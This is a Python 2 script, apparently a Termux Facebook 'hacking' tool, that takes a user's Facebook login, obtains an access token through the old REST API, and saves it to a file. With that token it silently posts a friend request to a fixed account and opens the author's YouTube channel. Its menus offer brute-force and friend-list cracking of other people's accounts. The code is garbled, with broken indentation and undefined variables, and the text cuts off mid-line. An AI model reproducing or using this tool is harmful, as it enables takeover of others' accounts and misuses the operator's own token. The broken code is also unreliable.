#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
print "\033[1;96m[!] \x1b[1;91mExit"
os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
for e in z + '\n':
sys.stdout.write(e)
sys.stdout.flush()
time.sleep(00000.1)


#### LOGO ####
logo = """
\033[0;39m  ▒▒▒▒▒▒▒▒RAWAND▒▒▒▒▒▒▒▒
\033[0;39m  ▒▒▄▄▄▒▒▒█▒▒▒▒▄▒▒▒▒▒▒▒▒
\033[0;39m  ▒█▀█▀█▒█▀█▒▒█▀█▒▄███▄▒
\033[0;39m  ░█▀█▀█░█▀██░█▀█░█▄█▄█░
\033[0;39m  ░█▀█▀█░█▀████▀█░█▄█▄█░
\033[0;39m  ████████▀█████████████
\033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|دنەوەڕ RAWAND\033[0;31m║
\033[0;39m║\033[1;33m* \033[1;33 RAWAND  \033[1;33m : \033[1;33m\033[4m❤💜❤💜\033[0m \033[0;31m║
\033[0;39m║\033[0;36m* \033[0;32You Tube \033[1;32m: \033[1;32m(MRRAWAND)[0;31m║
\033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""

def tik():
titik = ['.   ','..  ','... ']
for o in titik:
print("\r\033[1;96m[●] \x1b[1;93mSedang masuk \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mYOU TUBE : MR RAWAND\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
\033[1;93m [¤] \x1b[0;31mTOOLS BY RAWAND\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : MR RAWAND\x1b[0;31m"""
print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"

CorrectUsername = "MR"
CorrectPassword = "MRRAWAND"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[0;31mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    password = raw_input("\033[1;96m[☆] \x1b[0;31mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "yang bener dong"
            os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
    else:
        print "salah sayang!"
        os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')

def login():
os.system('clear')
try:
toket = open('login.txt','r')
menu() 
except (KeyError,IOError):
os.system('clear')
print logo
print 42*"\033[1;96m="
print('\033[1;96m[☆] \x1b[1;91mAPNA FACEBOOK ACCOUNT LOGIN KREIN \x1b[1;96m[☆]' )
id = raw_input('\033[1;96m[+] \x1b[0;34mID/Email \x1b[1;91m: \x1b[1;92m')
pwd = raw_input('\033[1;96m[+] \x1b[0;34mPassword \x1b[1;91m: \x1b[1;92m')
tik()
try:
br.open('https://m.facebook.com')
except mechanize.URLError:
print"\n\033[1;96m[!] \x1b[1;91mTidak ada koneksi"
keluar()
br._factory.is_html = True
br.select_form(nr=0)
br.form['email'] = id
br.form['pass'] = pwd
br.submit()
url = br.geturl()
if 'save-device' in url:
try:
sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
x=hashlib.new("md5")
x.update(sig)
a=x.hexdigest()
data.update({'sig':a})
url = "https://api.facebook.com/restserver.php"
r=requests.get(url,params=data)
z=json.loads(r.text)
unikers = open("login.txt", 'w')
unikers.write(z['access_token'])
unikers.close()
print '\n\x1b[1;36;40m[✓] Login Successful...'
os.system('xdg-open https://www.youtube.com/channel/UCwq6RUSe8gO4fUlXxX1HUQA')
requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
menu()
except requests.exceptions.ConnectionError:
print"\n\x1b[1;91m[!] There is no internet connection"
keluar()
if 'checkpoint' in url:
print("\n\x1b[1;92m[!] Your Account is on Checkpoint")
os.system('rm -rf login.txt')
time.sleep(1)
keluar()
else:
print("\n\x1b[1;93mPassword/Email is wrong")
os.system('rm -rf login.txt')
time.sleep(1)
login()


def menu():
os.system('clear')
try:
toket=open('login.txt','r').read()
except IOError:
os.system('clear')
print"\x1b[1;91m[!] Token invalid"
os.system('rm -rf login.txt')
time.sleep(1)
login()
try:
otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
a = json.loads(otw.text)
nama = a['name']
id = a['id']
ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
b = json.loads(ots.text)
sub = str(b['summary']['total_count'])
except KeyError:
os.system('clear')
print"\033[1;91mYour Account is on Checkpoint"
os.system('rm -rf login.txt')
time.sleep(1)
login()
except requests.exceptions.ConnectionError:
print"\x1b[1;92mThere is no internet connection"
keluar()
os.system("clear")
print logo
print "   \033[1;36;40m      ╔═════════════════════════════════╗"
print "   \033[1;36;40m      ║\033[1;32;40m[*] Name\033[1;32;40m: "+nama+"     \033[1;36;40m║"                               
print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
print "   \033[1;36;40m      ╚═════════════════════════════════╝"
print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"
print "\033[1;32;40m[2] \033[1;33;40m══Update Usama"
print "\033[1;32;40m[0] \033[1;33;40m══Log out"
pilih()

def pilih():
unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
if unikers =="":
print "\x1b[1;91mFill in correctly"
pilih()
elif unikers =="1":
super()
elif unikers =="2":
os.system('clear')
print logo
print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
os.system('git pull origin master')
raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
menu()
elif unikers =="0":
jalan('Token Removed')
os.system('rm -rf login.txt')
keluar()
else:
print "\x1b[1;91mFill in correctly"
pilih()

def super():
global toket
os.system('clear')
try:
toket=open('login.txt','r').read()
except IOError:
print"\x1b[1;91mToken invalid"
os.system('rm -rf login.txt')
time.sleep(1)
login()
os.system('clear')
print logo
print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
pilih_super()

def pilih_super():
peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
if peak =="":
print "\x1b[
